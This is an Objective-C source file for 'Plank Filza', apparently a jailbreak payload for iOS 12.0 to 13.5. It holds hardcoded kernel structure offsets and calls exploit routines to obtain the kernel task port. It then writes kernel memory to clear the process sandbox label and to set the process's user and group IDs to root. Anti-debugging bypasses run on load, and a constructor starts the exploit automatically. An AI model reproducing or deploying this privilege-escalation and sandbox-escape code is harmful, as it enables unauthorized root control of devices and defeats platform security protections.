//  pwner
//
//  Created by Brandon Plank on 10/1/20.
//  Copyright © 2020 Brandon Plank. All rights reserved.
//

#include <stdio.h>
#include "main.h"
#include "support.h"
#include "tardy0n.h"
#include "helpers.h"
#include <UIKit/UIKit.h>
#include "Kernel_Base.h"
#include "kmem.h"
#include <time_frame/time_frame.h>
#include "fishhook.h"
#include "BypassAntiDebugging.h"

@implementation PatchEntry

+ (void)load {
    disable_pt_deny_attach();
    disable_sysctl_debugger_checking();
        
    #if TESTS_BYPASS
    test_aniti_debugger();
    #endif
    [self showAlert];
}

mach_port_t task_port_k;
uint64_t kbase;
uint64_t kslide;

#if __arm64e__
int KSTRUCT_OFFSET_TASK_BSD_INFO = 0x388;
#else
int KSTRUCT_OFFSET_TASK_BSD_INFO = 0x380;
#endif
int off_p_pid = 0x68;
int off_task = 0x10;
int off_p_uid = 0x2c;
int off_p_gid = 0x30;
int off_p_ruid = 0x34;
int off_p_rgid = 0x38;
int off_p_ucred = 0x100;
int off_p_fd = 0x108;
int off_p_csflags = 0x298;
int off_p_comm = 0x258;
int off_p_textvp = 0x238;
int off_p_textoff = 0x240;
int off_p_cputype = 0x2b0;
int off_p_cpu_subtype = 0x2b4;
int off_itk_space = 0x320;
int off_csb_platform_binary = 0xa8;
int off_csb_platform_path = 0xac;
#if __arm64e__
int off_t_flags = 0x3d8;
#else
int off_t_flags = 0x3d0;
#endif
unsigned off_ucred_cr_uid = 0x18;
unsigned off_ucred_cr_ruid = 0x1c;
unsigned off_ucred_cr_svuid = 0x20;
unsigned off_ucred_cr_ngroups = 0x24;
unsigned off_ucred_cr_groups = 0x28;
unsigned off_ucred_cr_rgid = 0x68;
unsigned off_ucred_cr_svgid = 0x6c;
unsigned off_ucred_cr_label = 0x78;

uint64_t our_task_m;

NSString *error_msg;

bool root(){
    Log(log_info, "our task: 0x%016llx", our_task_m);
    uint64_t our_proc = rk64(our_task_m + KSTRUCT_OFFSET_TASK_BSD_INFO);
    
    
    uint64_t ucred = rk64(our_proc + 0x100);
    Log(log_info, "ucred: 0x%016llx", ucred);
    
    wk32(our_proc + off_p_uid, 0);
    wk32(our_proc + off_p_ruid, 0);
    wk32(our_proc + off_p_gid, 0);
    wk32(our_proc + off_p_rgid, 0);
    wk32(ucred + off_ucred_cr_uid, 0);
    wk32(ucred + off_ucred_cr_ruid, 0);
    wk32(ucred + off_ucred_cr_svuid, 0);
    wk32(ucred + off_ucred_cr_ngroups, 1);
    wk32(ucred + off_ucred_cr_groups, 0);
    wk32(ucred + off_ucred_cr_rgid, 0);
    wk32(ucred + off_ucred_cr_svgid, 0);
       
    return (rk32(our_proc + off_p_uid) == 0) ? YES : NO;
}

bool unsandbox(){
    if(SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(@"13.3")){
        our_task_m = getTaskSelf();
        escapeSandboxTime();
    } else {
        our_task_m = getOurTask();
        Log(log_info, "our task: 0x%016llx", our_task_m);
        uint64_t our_proc = rk64(our_task_m + KSTRUCT_OFFSET_TASK_BSD_INFO);
        
        uint64_t ucred = rk64(our_proc + 0x100);
        Log(log_info, "ucred: 0x%016llx", ucred);
        uint64_t cr_label = rk64(ucred + 0x78);
        Log(log_info, "cr_label: 0x%016llx", cr_label);
        uint64_t sandbox_addr = cr_label + 0x8 + 0x8;
        Log(log_info," sandbox_addr: 0x%016llx", sandbox_addr);
        wk64(sandbox_addr, (uint64_t) 0);
        //                            |
        //1 0 0 0 0 0 - Sandbox       |
        //0 0 0 0 0 0 - No Sandbox-----
        
        [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/test_plank_filza" contents:NULL attributes:nil];
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/test_plank_filza"])
        {
            [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/test_plank_filza" error:nil];
            return true;
        } else {
            return false;
        }
    }
    return true;
}

void error_popup(NSString *messgae_popup){
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIAlertController * alertController = [UIAlertController alertControllerWithTitle:@"Error" message:messgae_popup preferredStyle:UIAlertControllerStyleAlert];
        [alertController addAction:[UIAlertAction actionWithTitle:@"Ok" style:UIAlertActionStyleCancel handler:NULL]];
        UIViewController * controller = [UIApplication sharedApplication].keyWindow.rootViewController;
        while (controller.presentedViewController) {
            controller = controller.presentedViewController;
        }
        [controller presentViewController:alertController animated:YES completion:NULL];
    });
}

int start() {
    //Start exploitation to gain tfp0.
    Log(log_info, "==Plank Filza==");
    if(SYSTEM_VERSION_LESS_THAN(@"12.0") || SYSTEM_VERSION_GREATER_THAN(@"13.5")){
        Log(log_error, "Incorrect version");
    } else {
        if(SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(@"13.3")){
            task_port_k = run_time_waste();
        } else {
            tardy0n();
            task_port_k = getTaskPort();
        }
        if(task_port_k != MACH_PORT_NULL){
            Log(log_info, "tfp0: 0x%d", task_port_k);
            //Use dementios nonce setter to get the kernel base and slide from only tfp0.
            kbase = get_kbase(&kslide, task_port_k);
            Log(log_info, "Unsandboxing");
            if(unsandbox()){
                if(root()){
                    Log(log_info, "We got root!");
                    Log(log_info, "UID after rootify: %d", getuid());
                } else {
                    Log(log_error, "Failed to gain root!");
                    error_popup(@"Failed to gain root.");
                }
            } else {
                Log(log_error, "Failed to unsandbox!");
                error_popup(@"Failed to unsandbox.");
            }
        } else {
            Log(log_error, "Failed to get the kernel task port");
            error_popup(@"Failed to get tfp0.");
        }
    }
    return 0;
}

NSString *notice_json;
NSString *message;
BOOL can_show_msg = true;
BOOL error = false;
+ (void)showAlert
{
    NSURLSession *aSession = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration]];
    [[aSession dataTaskWithURL:[NSURL URLWithString:@"https://brandonplank.org/json/PlankFilza.json"] completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if(error != nil){
            Log(log_error, "we got an error...\n");
        }
        if (((NSHTTPURLResponse *)response).statusCode == 200) {
            if (data) {
                NSString *contentOfURL = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                //NSLog(@"%@", contentOfURL);
                notice_json = contentOfURL;
            } else {
                Log(log_error, "nil\n");
            }
        } else {
           Log(log_error, "200\n");
        }
    }] resume];
    
    for(int i = 0; i<22; i++){
        if(notice_json == nil){
            if(i == 21){
                error = true;
                break;
            }
            Log(log_i,"Retrying msg check %d/20...\n", i);
            usleep(200000);
        } else {
            Log(log_i, "Got var!\n");
            NSData* jsonData = [notice_json dataUsingEncoding:NSUTF8StringEncoding];
            
            NSError *jsonError;
            id allKeys = [NSJSONSerialization JSONObjectWithData:jsonData options:(NSJSONReadingOptions)NSJSONWritingPrettyPrinted error:&jsonError];
            
            
            for (int i=0; i<[allKeys count]; i++) {
                NSDictionary *arrayResult = [allKeys objectAtIndex:i];
                message = [arrayResult objectForKey:@"beginning_notice"];
                Log(log_info,"Starting message print from json.\n==============================\n");
                Log(log_info, "%s\n",[message UTF8String]);
                Log(log_info, "\n==============================\n");
                can_show_msg = (BOOL)[arrayResult objectForKey:@"can_show_alert"];
            }
            break;
        }
    }
    if(error){
        Log(log_error, "Failed to get msg...\n");
        notice_json = @"Plank Filza by Brandon Plank(@_bplank)\n\nCoryright 2020 Brandon Plank";
    }
    if(can_show_msg){
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            UIAlertController * alertController = [UIAlertController alertControllerWithTitle:@"Notice" message:message preferredStyle:UIAlertControllerStyleAlert];
            [alertController addAction:[UIAlertAction actionWithTitle:@"Ok" style:UIAlertActionStyleCancel handler:NULL]];
            UIViewController * controller = [UIApplication sharedApplication].keyWindow.rootViewController;
            while (controller.presentedViewController) {
                controller = controller.presentedViewController;
            }
            [controller presentViewController:alertController animated:YES completion:NULL];
        });
    } else {
        Log(log_info, "Not showing msg.\n");
    }
}

__attribute__((constructor))
void Constructor() {
    start();
}

@end
